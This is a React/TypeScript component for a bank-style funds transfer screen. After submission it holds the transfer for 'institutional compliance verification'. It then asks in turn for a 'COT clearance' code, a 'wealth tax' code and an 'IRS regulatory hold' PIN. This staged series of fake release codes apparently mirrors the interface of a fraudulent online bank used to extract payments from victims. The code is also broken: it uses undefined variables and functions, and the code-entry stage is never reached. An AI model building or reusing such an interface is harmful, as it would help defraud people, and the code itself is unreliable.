import React, { useState } from 'react';
import { 
  ArrowRight, 
  RefreshCcw, 
  ShieldCheck, 
  AlertTriangle, 
  CheckCircle2, 
  Lock 
} from 'lucide-react';
import { useAuthStore } from '../store/authStore';
import { customerService } from '../services/customerService';
import { TransferStage } from '../lib/transfer';

interface TransferUIProps {
  onSuccess: () => void;
}

const TransferUI: React.FC<TransferUIProps> = ({ onSuccess }) => {
  const { user } = useAuthStore();
  const [amount, setAmount] = useState('');
  const [recipient, setRecipient] = useState('');
  const [narration, setNarration] = useState('');
  
  const [status, setStatus] = useState<'IDLE' | 'PROCESSING' | 'SUCCESS'>('IDLE');
  const [stage, setStage] = useState<TransferStage | null>(null);
  const [inputCode, setInputCode] = useState('');
  const [error, setError] = useState('');

  const handleInitiate = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!amount || !recipient || !user) return;
    
    setStatus('PROCESSING');
    setError('');
    
    try {
      await customerService.initiateTransfer(user.id, Number(amount), recipient, narration);
      setStatus('SUCCESS');
    } catch (err: any) {
      setError(err.message || "Failed to initiate release sequence.");
      setStatus('IDLE');
    }
  };

  const executeFinal = () => {
    // Legacy - No longer used as RPC handles finality
  };

  if (status === 'SUCCESS') {
    return (
      <div className="max-w-2xl mx-auto py-20 text-center space-y-8 animate-slide-up">
        <div className="h-32 w-32 bg-amber-50 rounded-full flex items-center justify-center mx-auto border border-amber-100">
          <ShieldCheck size={64} className="text-amber-500" />
        </div>
        <div>
          <h3 className="text-4xl font-black tracking-tighter uppercase">Transfer Queued</h3>
          <p className="text-gray-400 mt-4 font-black uppercase tracking-[0.2em] text-[10px]">Release sequence initiated. Awaiting institutional compliance verification.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto py-12 animate-slide-up">
      <div className="bg-white border border-gray-100 rounded-[3.5rem] shadow-2xl overflow-hidden relative">
        <div className="p-12">
          {!stage ? (
            <form onSubmit={handleInitiate} className="space-y-10">
              <div className="space-y-6">
                <input
                  required className="w-full bg-gray-50 border border-gray-100 rounded-2xl p-5 outline-none focus:border-[#C00000] transition-all font-bold"
                  placeholder="Recipient Identity"
                  value={recipient} onChange={e => setRecipient(e.target.value)}
                />
                <input
                  type="number" required
                  className="w-full bg-gray-50 border border-gray-100 rounded-2xl p-5 outline-none focus:border-[#C00000] transition-all text-2xl font-bold"
                  placeholder="Amount ($)"
                  value={amount} onChange={e => setAmount(e.target.value)}
                />
                <input
                  className="w-full bg-gray-50 border border-gray-100 rounded-2xl p-5 outline-none focus:border-[#C00000] transition-all"
                  placeholder="Audit Narration"
                  value={narration} onChange={e => setNarration(e.target.value)}
                />
              </div>

              {error && (
                <div className="p-4 bg-red-50 border border-red-100 rounded-2xl text-red-600 text-[10px] font-black uppercase tracking-widest flex items-center gap-3">
                  <AlertTriangle size={14} />
                  {error}
                </div>
              )}

              <button 
                disabled={status === 'PROCESSING'} 
                className="w-full bg-[#C00000] hover:bg-[#A00000] text-white font-black py-6 rounded-2xl shadow-xl transition-all flex items-center justify-center gap-3 uppercase tracking-widest"
              >
                {status === 'PROCESSING' ? <RefreshCcw className="animate-spin" /> : <span>Initiate Release Sequence</span>}
              </button>
            </form>
          ) : (
            <div className="text-center space-y-12 py-6">
              <div className="space-y-6">
                <div className="h-24 w-24 rounded-[2rem] bg-amber-50 border border-amber-100 flex items-center justify-center mx-auto">
                  <Lock size={40} className="text-amber-500 animate-pulse" />
                </div>
                <div>
                  <h3 className="text-xl font-bold tracking-tight mb-2">
                    {stage === 'cot' ? 'COT Clearance Required' : stage === 'tax' ? 'Wealth Tax Verification' : 'IRS Regulatory Hold'}
                  </h3>
                  <p className="text-gray-400 text-sm mb-6 max-w-sm mx-auto">
                    {stage === 'cot' ? 'Enter Certificate of Transfer code.' : 
                     stage === 'tax' ? 'Wealth tax clearance code required.' : 
                     'Federal IRS clearance pin required.'}
                  </p>
                </div>
              </div>

              <div className="max-w-sm mx-auto space-y-6">
                <input
                  type="text" value={inputCode}
                  onChange={(e) => setInputCode(e.target.value.toUpperCase())}
                  className="w-full bg-white border-2 border-amber-200 rounded-3xl py-8 px-6 text-center text-4xl font-black text-amber-500 outline-none focus:border-amber-500 transition-all tracking-[0.2em]"
                  placeholder="X-XXXX-X"
                />
                
                {error && <p className="text-red-500 text-[10px] font-black uppercase tracking-widest">{error}</p>}

                <button 
                  onClick={verifyCode} disabled={loading || !userInputCode} 
                  className="w-full bg-amber-500 hover:bg-amber-600 text-white font-black py-6 rounded-2xl transition-all shadow-2xl shadow-amber-500/20 uppercase tracking-widest"
                >
                  {loading ? <RefreshCcw className="animate-spin" /> : <span>Verify {stage} Authorization</span>}
                </button>
              </div>
              
              <div className="flex justify-center items-center gap-4 text-gray-200">
                <div className={`h-2 w-2 rounded-full transition-colors ${progress >= 33 ? 'bg-[#C00000]' : 'bg-gray-200'}`} />
                <div className={`h-2 w-2 rounded-full transition-colors ${progress >= 66 ? 'bg-[#C00000]' : 'bg-gray-200'}`} />
                <div className={`h-2 w-2 rounded-full transition-colors ${progress >= 90 ? 'bg-[#C00000]' : 'bg-gray-200'}`} />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default TransferUI;
